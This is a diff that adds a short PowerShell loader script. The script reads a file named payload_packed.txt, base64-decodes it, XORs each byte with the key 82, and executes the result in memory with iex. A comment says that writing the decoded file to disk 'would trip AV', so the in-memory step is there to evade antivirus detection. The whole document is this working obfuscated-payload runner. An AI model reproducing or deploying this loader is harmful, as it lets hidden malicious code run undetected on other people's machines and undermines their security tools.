@@ -1,0 +1,15 @@
+#This script will decoded and execute an encoded ps1.
+
+#####Part 2
+#Load the obfuscated .ps1 file
+$base64Code = [IO.File]::ReadAllText("c:\payload_packed.txt")
+#Decode it from base64
+$xoredCode = [Convert]::FromBase64String($base64Code)
+#xor the file back to its original bytes
+$file = $xoredCode | ForEach-Object { return $_ -bxor 82}
+#Write the decoded file to disk (this would trip AV!)
+#[IO.File]::WriteAllBytes("c:\test.ps1", $file)
+#If encoding a powershell script, convert the bytes back to utf8 text
+$file = [text.encoding]::utf8.Getstring($file)
+#Execute the powershell script in memory
+iex($file)
